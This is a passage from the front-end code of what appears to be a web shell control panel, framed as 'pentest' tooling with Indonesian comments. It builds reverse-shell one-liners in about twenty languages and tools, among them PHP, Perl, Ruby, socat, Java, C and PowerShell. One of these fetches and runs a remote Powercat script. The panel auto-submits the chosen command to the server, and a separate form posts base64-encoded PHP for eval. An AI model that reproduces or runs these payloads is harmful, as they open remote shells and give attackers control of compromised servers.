                command = `php -r '$sock=fsockopen("${ip}",${port});shell_exec("/bin/sh -i <&3 >&3 2>&3");'`;
                break;
            // PHP system
            case 'php_system':
                command = `php -r '$sock=fsockopen("${ip}",${port});system("/bin/sh -i <&3 >&3 2>&3");'`;
                break;
            // Perl
            case 'perl':
                command = `perl -e 'use Socket;$i="${ip}";$p=${port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`;
                break;
            // Perl no sh
            case 'perl_nosh':
                command = `perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"${ip}:${port}");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'`;
                break;
            // Ruby
            case 'ruby':
                command = `ruby -rsocket -e'f=TCPSocket.open("${ip}",${port}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`;
                break;
            // Ruby no sh
            case 'ruby_nosh':
                command = `ruby -rsocket -e 'exit if fork;c=TCPSocket.new("${ip}","${port}");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'`;
                break;
            // socat
            case 'socat':
                command = `socat TCP:${ip}:${port} EXEC:/bin/sh`;
                break;
            // socat TTY
            case 'socat_tty':
                command = `socat TCP:${ip}:${port} EXEC:'/bin/sh',pty,stderr,setsid,sigint,sane`;
                break;
            // AWK
            case 'awk':
                command = `awk 'BEGIN {s = "/inet/tcp/0/${ip}/${port}"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null`;
                break;
            // Lua
            case 'lua':
                command = `lua -e "require('socket');require('os');t=socket.tcp();t:connect('${ip}','${port}');os.execute('/bin/sh -i <&3 >&3 2>&3');"`;
                break;
            // Lua5.1
            case 'lua51':
                command = `lua5.1 -e 'local host,port="${ip}",${port} local socket=require("socket") local tcp=socket.tcp() local io=require("io") tcp:connect(host,port); while true do local cmd,status,partial=tcp:receive() local f=io.popen(cmd,"r") local s=f:read("*a") f:close() tcp:send(s) if status=="closed" then break end end tcp:close()'`;
                break;
            // Telnet
            case 'telnet':
                command = `TF=$(mktemp -u);mkfifo $TF && telnet ${ip} ${port} 0<$TF | /bin/sh 1>$TF`;
                break;
            // Golang
            case 'golang':
                command = `echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","${ip}:${port}");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go`;
                break;
            // Node.js
            case 'nodejs':
                command = `node -e 'require("child_process").exec("/bin/sh -i >& /dev/tcp/${ip}/${port} 0>&1")'`;
                break;
            // Java
            case 'java':
                command = `echo 'import java.io.InputStream;import java.io.OutputStream;import java.net.Socket;public class shell{public static void main(String[] args)throws Exception{String host="${ip}";int port=${port};String cmd="/bin/sh";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);}p.destroy();s.close();}}' > /tmp/shell.java && cd /tmp && javac shell.java && java shell`;
                break;
            // C
            case 'c':
                command = `echo '#include <stdio.h>\\n#include <sys/socket.h>\\n#include <netdb.h>\\n#include <unistd.h>\\nint main(){struct sockaddr_in s;s.sin_family=AF_INET;s.sin_port=htons(${port});inet_aton("${ip}",&s.sin_addr);int sock=socket(AF_INET,SOCK_STREAM,0);connect(sock,(struct sockaddr*)&s,sizeof(s));dup2(sock,0);dup2(sock,1);dup2(sock,2);execve("/bin/sh",NULL,NULL);}' > /tmp/shell.c && gcc /tmp/shell.c -o /tmp/shell && /tmp/shell`;
                break;
            // Powershell (Windows)
            case 'powershell':
                command = `powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('${ip}',${port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`;
                break;
            // Powercat (Windows)
            case 'powercat':
                command = `IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c ${ip} -p ${port} -e cmd`;
                break;
        }
        
        const cmdInput = document.getElementById('cmdInputText');
        if (cmdInput) {
            cmdInput.value = command;
            cmdInput.focus();
            closePentestForm('backconnectFormContainer');
            setTimeout(() => {
                const cmdForm = cmdInput.closest('form');
                if (cmdForm) cmdForm.submit();
            }, 100);
        }
    };
    
    // Show PHP Eval Form
    function showPhpEvalForm() {
        let form = document.getElementById('phpEvalFormContainer');
        if (!form) {
            form = createPentestForm('phpEvalFormContainer', 'PHP Eval (Code Execution)', `
                <div style="margin-bottom:10px;">
                    <label style="color:#888;font-size:12px;">PHP Code:</label>
                    <textarea id="phpCode" placeholder="echo phpinfo();" style="width:100%;margin-top:5px;height:120px;font-family:monospace;">echo 'Current User: ' . exec('whoami') . "\n";
echo 'System: ' . php_uname() . "\n";
echo 'PHP Version: ' . phpversion();</textarea>
                </div>
                <div style="display:flex;gap:10px;">
                    <button type="button" onclick="executePhpEval()" class="btn-upload">Execute</button>
                    <button type="button" onclick="closePentestForm('phpEvalFormContainer')" style="background:#444;">Cancel</button>
                </div>
            `);
        }
        form.style.display = 'block';
        document.getElementById('phpCode').focus();
    }
    
    // Execute PHP Eval
    window.executePhpEval = function() {
        const code = document.getElementById('phpCode').value.trim();
        if (!code) {
            alert('Please enter PHP code');
            return;
        }
        
        // Create temporary form to submit PHP code
        const form = document.createElement('form');
        form.method = 'POST';
        form.style.display = 'none';
        
        const codeInput = document.createElement('input');
        codeInput.type = 'hidden';
        codeInput.name = 'php_eval_code';
        codeInput.value = btoa(code); // Encode to base64
        
        form.appendChild(codeInput);
        document.body.appendChild(form);
        form.submit();
    };
    
    // Helper function to create pentest forms
    function createPentestForm(id, title, content) {
        const div = document.createElement('div');
        div.id = id;
        div.className = 'form-container';
        div.style.cssText = 'display:none;position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);width:500px;max-width:90%;z-index:100000;background:#1a1a1a;border:1px solid #ff6666;border-radius:8px;padding:20px;box-shadow:0 10px 40px rgba(0,0,0,0.9);';
        div.innerHTML = `
            <div style="color:#ff6666;font-weight:bold;margin-bottom:15px;font-size:16px;border-bottom:1px solid #333;padding-bottom:10px;">${title}</div>
            ${content}
        `;
        document.body.appendChild(div);
        return div;
    }
    
    // Helper to close pentest forms
    window.closePentestForm = function(id) {
        const form = document.getElementById(id);
        if (form) form.style.display = 'none';
    };
    
    // Close forms on Escape
    document.addEventListener('keydown', function(e) {
        if (e.key === 'Escape') {
            ['scanPortFormContainer', 'backconnectFormContainer', 'phpEvalFormContainer'].forEach(id => {
                closePentestForm(id);
            });
        }
    });
    
    // Buka tools palette
    function openToolsPalette() {
        toolsPalette.classList.add('active');
        toolsOverlay.classList.add('active');
        toolsSearch.value = '';
        toolsSearch.focus();
        filteredTools = detectTools();
        renderTools(filteredTools);
    }
    
    // Tutup tools palette
    function closeToolsPalette() {
        toolsPalette.classList.remove('active');
        toolsOverlay.classList.remove('active');
        selectedIndex = -1;
    }
    
    // Navigate selection
    function navigateSelection(direction) {
        if (filteredTools.length === 0) return;
        
        if (direction === 'down') {
            selectedIndex = (selectedIndex + 1) % filteredTools.length;
        } else {
            selectedIndex = selectedIndex <= 0 ? filteredTools.length - 1 : selectedIndex - 1;
        }
        
        renderTools(filteredTools);
        
        // Scroll ke item yang aktif
        const activeItem = toolsList.querySelector('.tool-item.active');
        if (activeItem) {
            activeItem.scrollIntoView({ block: 'nearest' });
        }
    }
    
    // Event listeners
    document.addEventListener('keydown', function(e) {
        // Ctrl+Shift+T untuk buka tools palette
        if ((e.ctrlKey || e.metaKey) && e.shiftKey && (e.key === 'F' || e.key === 'f')) {
            e.preventDefault();
            openToolsPalette();
        }
        
        // Handle keyboard saat palette terbuka
        if (toolsPalette.classList.contains('active')) {
            if (e.key === 'Escape') {
                closeToolsPalette();
            } else if (e.key === 'ArrowDown') {
                e.preventDefault();
                navigateSelection('down');
            } else if (e.key === 'ArrowUp') {
                e.preventDefault();
                navigateSelection('up');
            } else if (e.key === 'Enter') {
                e.preventDefault();
                if (selectedIndex >= 0 && filteredTools[selectedIndex]) {
                    executeTool(filteredTools[selectedIndex].name);
                }
            } else if (e.key === 'Tab') {
                e.preventDefault();
                navigateSelection(e.shiftKey ? 'up' : 'down');
            }
        }
    });
    
    // Search input
    toolsSearch.addEventListener('input', function() {
        filterTools(this.value);
    });
    
    // Overlay click
    toolsOverlay.addEventListener('click', closeToolsPalette);
    
    // Expose function globally untuk debugging
    window.openToolsPalette = openToolsPalette;
});
</script>

</body>
</html>
